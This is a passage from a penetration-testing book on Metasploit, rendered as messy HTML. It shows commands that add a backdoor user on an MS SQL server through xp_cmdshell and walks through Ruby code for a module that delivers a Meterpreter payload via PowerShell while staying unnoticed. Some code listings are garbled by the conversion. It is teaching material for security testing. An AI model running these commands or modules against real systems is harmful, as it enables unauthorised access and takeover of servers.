2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:161pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:43pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:131pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:161pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1433</p></td><td style="width:43pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:131pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:10pt"><td style="width:41pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">USERNAME</p></td><td style="width:161pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">sa</p></td><td style="width:43pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:131pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">The username to authenticate as</p></td></tr></table><p class="s30" style="padding-top: 1pt;padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@ <span class="s25">msf auxiliary(mssql_exec) </span><span class="s24">&gt; set RHOST 172.16.32.136</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">RHOST =&gt; 172.16.32.136</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">msf auxiliary(mssql_exec) &gt; </span><span class="s24">set CMD net user metasploit p@55w0rd /ADD</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CMD =&gt; net user metasploit p@55w0rd /ADD</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_exec) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="34" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_508.png"/></span></p><p class="s25" style="padding-left: 40pt;text-indent: -4pt;line-height: 193%;text-align: left;">[*] SQL Query: EXEC master..xp_cmdshell &#39;net user metasploit p@55w0rd /ADD&#39; output</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 13pt;text-align: left;">@ <span class="s25">The command completed successfully.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Auxiliary module execution completed msf auxiliary(mssql_exec) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_509.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: left;">In this example, we first select the <span class="s19">mssql_exec </span>auxiliary module at <span class="s32">O</span>, which calls the <span class="s25">xp_cmdshell </span>stored procedure to execute commands. Next, we view the module’s options at <span class="s32">8 </span>and set our target at <span class="s32">@ </span>and the command to exe- cute on the target at <span class="s32">O</span>. Finally, we run the exploit with <span class="s25">exploit</span>, and you can see at <span class="s32">@ </span>that the exploit is successful. We’ve added a user to the system using the <span class="s25">xp_cmdshell </span>stored procedure. (At this point we could enter <span class="s25">net localgroup</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">administrators metasploit /ADD <span class="p">to add the user to the local administrators group on the compromised system.)</span></p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">You can think of the <span class="s19">mssql_exec </span>module as a command prompt accessible via MS SQL.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark360">Exploring an Existing Metasploit Module</a><a name="bookmark372">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now we’ll examine what is actually occurring “under the hood” of the module we just worked with, <span class="s19">mssql_exec. </span>This allows us to get a feel for how existing code is operating before we write our own. Let’s open the module with a text editor to see how it operates:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_510.png"/></span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3# nano modules/auxiliary/admin/mssql/mssql_exec.rb</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_511.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The following lines excerpted from the module yield a few important things worthy of note:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_512.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">require &#39;msf/core&#39;</span></p><p class="s30" style="padding-top: 6pt;padding-left: 24pt;text-indent: 0pt;text-align: left;">8 <span class="s25">class Metasploit3 &lt; Msf::Auxiliary</span></p><p class="s30" style="padding-top: 6pt;padding-left: 62pt;text-indent: 0pt;text-align: left;">@<span class="s25">include Msf::Exploit::Remote::MSSQL</span></p><p class="s25" style="padding-top: 7pt;padding-left: 70pt;text-indent: 0pt;line-height: 10pt;text-align: left;">def run</p><p class="s30" style="padding-left: 113pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O<span class="s25">mssql_xpcmdshell(datastore[&#39;CMD&#39;], true)</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">if mssql_login_datastore</p><p class="s25" style="padding-bottom: 4pt;padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_513.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">The first line at <span class="s32">O </span>tells us that this module will include all functionality from Metasploit’s core libraries. Next the class is set at <span class="s32">8 </span>with code that defines this as an auxiliary module that inherits certain characteristics of, for example,</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">scanners, denial-of-service vectors, data retrieval, brute force attacks, and reconnaissance attempts.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: justify;">The <span class="s25">include </span>statement at <span class="s32">@ </span>is probably one of the most important lines, because it pulls in the MS SQL module from the core Metasploit libraries.</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 82%;text-align: left;">Essentially, the MS SQL module handles all MS SQL–based communications and anything related to MS SQL. Finally, at <span class="s32">O </span>it pulls a specific command from the Metasploit datastore.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s examine the MS SQL function in the Metasploit core libraries to get a better understanding of its power. First, open <span class="s19">mssql.rb </span>and then</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">mssql_commands.rb <span class="p">with the following commands, each in a different window:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_514.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">nano lib/msf/core/exploit/mssql.rb</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">nano lib/msf/core/exploit/mssql_commands.rb</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_515.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Press <span class="s9">CTRL</span>-W in Nano to search for <span class="s25">mssql_xpcmdshell </span>in <span class="s19">mssql.rb</span>, and you should find the definition that tells Metasploit how to use the <span class="s25">xp_cmdshell </span>pro- cedure, as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_516.png"/></span></p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;"># Execute a system command via xp_cmdshell #</p><p class="s25" style="padding-left: 104pt;text-indent: -34pt;text-align: left;">def mssql_xpcmdshell(cmd,doprint=false,opts={}) force_enable = false</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;line-height: 11pt;text-align: left;">begin</p><p class="s25" style="padding-bottom: 2pt;padding-left: 138pt;text-indent: 0pt;line-height: 13pt;text-align: left;">res = mssql_query(&quot;EXEC master..xp_cmdshell<span class="s30">O </span>&#39;#{cmd}&#39;<span class="s30">8</span>&quot;, false, opts)</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_517.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: justify;">This listing defines the SQL query to be run against the server as a call to the <span class="s25">xp_cmdshell </span>stored procedure at <span class="s32">O </span>and a variable that will be replaced with the command line the user requests to be executed at <span class="s32">8</span>. For instance,</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">an attempt to add a user to the system would execute within MS SQL as <span class="s25">EXEC</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">master..xp_cmdshell &#39;net user metasploit p@55w0rd! /ADD&#39; <span class="p">by setting the </span>cmd <span class="p">vari- able to </span>&#39;net user metasploit p@55w0rd! /ADD&#39;<span class="p">.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now turn your attention to the <span class="s19">mssql_commands.rb</span>, where the commands to enable the <span class="s25">xp_cmdshell </span>procedure live:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_518.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># Re-enable the xp_cmdshell stored procedure in 2005 and 2008 def mssql_xpcmdshell_enable(opts={});</p><p class="s25" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 76%;text-align: left;">&quot;exec master.dbo.sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec master.dbo.sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;&quot;<span class="s30">O</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_519.png"/></span></p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;line-height: 16pt;text-align: left;">Here you can see the sequence of commands <span class="s32">O </span>issued to re-enable the</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">xp_cmdshell <span class="p">stored procedure in MS SQL Server 2005 and 2008.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that you understand the functions we will be using in creating our own module, let’s get started.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark361">Creating a New Module</a><a name="bookmark373">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Suppose you’re working on a penetration test and you encounter a system running SQL Server 2008 and Microsoft Server 2008 R2. Because Microsoft removed <span class="s19">debug.exe </span>on Windows 7 x64 and Windows Server 2008, these systems won’t allow you to convert executables in a traditional way as defined in Chapter 11. That means you need to create a new module that will allow you to attack a Microsoft Server 2008 and SQL Server 2008 instance successfully.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We’ll make certain assumptions for purposes of this scenario. First, you’ve already guessed that the SQL Server password is blank, and you have gained access to the <span class="s25">xp_cmdshell </span>stored procedure. You need to deliver a Meterpreter payload onto the system, but all ports other than 1433 are closed. You don’t know whether a physical firewall is in place or if the Windows-based firewall is in use, but you don’t want to modify the port list or turn off the firewall because that might raise suspicion.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark362">PowerShell</a><a name="bookmark374">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Windows PowerShell is our only viable option here. PowerShell is a compre- hensive Windows scripting language that allows you to access the full Microsoft</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">.NET Framework from the command line. PowerShell’s active community works at extending the tool, making it a valuable tool for security professionals because of its versatility and compatibility with .NET. We aren’t specifically going to dive into how PowerShell works and its functions, but you should know that it is a full-fledged programmatic language available to you on newer operating systems.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We’ll create a new module that will use Metasploit to convert the binary code to hexadecimal (or Base64 if desired), and then echo it onto the under- lying operating system. Then we’ll use PowerShell to convert the executable back to a binary that you can execute.</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">To begin, we create a boilerplate by copying the <span class="s19">mssql_payload </span>exploit as follows:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_520.png"/></span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 57pt;text-indent: -21pt;line-height: 90%;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">cp modules/exploits/windows/mssql/mssql_payload.rb modules/exploits/windows/mssql/mssql_powershell.rb</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_521.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we open the <span class="s19">mssql_powershell.rb </span>file we just created and modify its code so that it looks just like the following. This is an exploit base shell. Take some time to review the various parameters and remember the topics covered in the previous chapters.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_522.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39; # require core libraries</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 57pt;text-indent: -21pt;text-align: left;">class Metasploit3 &lt; Msf::Exploit::Remote # define this as a remote exploit Rank = ExcellentRanking # reliable exploit ranking</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">include Msf::Exploit::Remote::MSSQL # include the mssql.rb library</p><p class="s25" style="padding-top: 3pt;padding-left: 57pt;text-indent: 0pt;line-height: 10pt;text-align: left;">def initialize(info = {}) # initialize the basic template</p><p class="s30" style="padding-left: 66pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O<span class="s25">super(update_info(info,</span></p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&#39;Name&#39; =&gt; &#39;Microsoft SQL Server PowerShell Payload&#39;,</p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Description&#39; =&gt; %q{</p><p class="s25" style="padding-left: 163pt;text-indent: -21pt;line-height: 88%;text-align: left;">This module will deliver our payload through Microsoft PowerShell using MSSQL based attack vectors.</p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;text-align: left;">&#39;Author&#39; =&gt; [ &#39;David Kennedy &quot;ReL1K&quot; &lt;kennedyd013[at]gmail.com&gt;&#39;], &#39;License&#39; =&gt; MSF_LICENSE,</p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;text-align: left;">&#39;Version&#39; =&gt; &#39;$Revision: 8771 $&#39;, &#39;References&#39; =&gt;</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s25" style="padding-left: 142pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;URL&#39;, &#39;http://www.secmaniac.com&#39; ]</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s30" style="padding-left: 100pt;text-indent: -7pt;line-height: 80%;text-align: left;">8<span class="s25">&#39;Platform&#39; =&gt; &#39;win&#39;, # target only windows &#39;Targets&#39; =&gt;</span></p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">[</p><p class="s25" style="padding-left: 142pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[ &#39;Automatic&#39;, { } ], # automatic targeting</p><p class="s25" style="padding-left: 121pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s30" style="padding-left: 92pt;text-indent: 0pt;line-height: 11pt;text-align: left;">@<span class="s25">&#39;DefaultTarget&#39; =&gt; 0</span></p><p class="s25" style="padding-left: 100pt;text-indent: 0pt;line-height: 9pt;text-align: left;">))</p><p class="s25" style="padding-left: 100pt;text-indent: -21pt;text-align: left;">register_options( # register options for the user to pick from [</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p class="s30" style="padding-top: 4pt;padding-left: 65pt;text-indent: -28pt;line-height: 72%;text-align: left;">O<span class="s25">OptBool.new(&#39;UsePowerShell&#39;,[ false, &quot;Use PowerShell as payload delivery method instead&quot;, true]), # default to PowerShell</span></p><p class="s25" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">])</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 57pt;text-indent: 0pt;text-align: left;">def exploit # define our exploit here; it does nothing at this point</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 6pt;text-indent: 0pt;text-align: left;">end</p><p class="s30" style="padding-top: 4pt;padding-left: 6pt;text-indent: -6pt;line-height: 80%;text-align: left;">@<span class="s25">handler # call the Metasploit handler disconnect # after handler disconnect</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_523.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: left;">Before this exploit will work properly, you’ll need to define some basic settings. Notice that the name, description, licensing, and references are defined at <span class="s32">O</span>. We also define a platform at <span class="s32">8 </span>(Windows) and a target at <span class="s32">@</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 8pt;text-align: left;">(all operating systems). We also define a new parameter called <span class="s25">UsePowerShell</span></p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;">at <span class="s32">O </span>for use in the body of the exploit. Lastly, a handler is specified at <span class="s32">@ </span>to handle the connections between the attacker and the exploited target.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark363">Running the Shell Exploit</a><a name="bookmark375">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">With the skeleton of the exploit built, we run it through <span class="s19">msfconsole </span>to see what options are available:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_524.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use windows/mssql/mssql_powershell</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(mssql_powershell) &gt; <span class="s24">show options</span></p><p class="s25" style="padding-top: 3pt;text-indent: 0pt;text-align: right;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:36.26pt" cellspacing="0"><tr style="height:16pt"><td style="width:13pt" rowspan="5"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:196pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PASSWORD</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:196pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The password for the specified username</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:196pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1433</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:196pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:11pt"><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">USERNAME</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">sa</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:196pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The username to authenticate as</p></td></tr><tr style="height:15pt"><td style="width:13pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:64pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">UsePowerShell</p></td><td style="width:63pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">true</p></td><td style="width:9pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:196pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Use PowerShell as payload delivery method instead</p></td></tr></table><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Recall from Chapter 5 that the <span class="s25">show options </span>command will display any new options that have been added to an exploit. After we set these options, they will be stored within Metasploit as valid options.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now we’ll finalize the <span class="s19">mssql_powershell.rb </span>file, which we have been editing since the beginning of this chapter, before we edit <span class="s19">mssql.rb </span>(which will be explained shortly).</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When you examine the exploits in the <span class="s19">modules </span>directory inside Metasploit (<span class="s19">modules/exploits</span>, <span class="s19">modules/auxiliary/</span>, and so on), you’ll notice that most of them have the same overall structure (<span class="s25">def </span>exploit as an example). Remember always to comment your code to give other developers an idea of what it’s doing! In the following listing, we first introduce our <span class="s25">def exploit </span>line, which defines what we’ll be doing in our exploit. We’ll frame our exploit the same way as the other modules and add a few new sections, as explained next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_525.png"/></span></p><p class="s25" style="text-indent: 0pt;text-align: right;">def exploit</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;"># if u/n and p/w didn&#39;t work throw error</p><p class="s25" style="padding-top: 1pt;padding-left: 100pt;text-indent: -20pt;line-height: 75%;text-align: left;"><span class="s30">O</span>if(not mssql_login_datastore) <span class="s30">8</span>print_status(<span class="s24">&quot;Invalid SQL Server credentials&quot;</span>) return</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;"># Use powershell method for payload delivery</p><p class="s30" style="padding-left: 79pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@<span class="s25">if (datastore[&#39;UsePowerShell&#39;])</span></p><p class="s30" style="padding-top: 6pt;padding-left: 79pt;text-indent: 0pt;text-align: left;">O<span class="s25">powershell_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded))</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 6pt;text-indent: 0pt;text-align: left;">end</p><p class="s25" style="padding-top: 4pt;padding-left: 14pt;text-indent: 0pt;text-align: left;">end handler disconnect</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_526.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;">The module first checks to see if we are logged in at <span class="s32">O</span>. If we aren’t logged in, the error message <span class="s25">&quot;Invalid SQL Server Credentials&quot; </span><span class="s32">8 </span>is displayed. The <span class="s25">UsePowerShell </span>method at <span class="s32">@ </span>is used to call the function <span class="s25">powershell_upload_exec </span><span class="s32">O</span>, which will automatically create a Metasploit-based payload that we specify</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 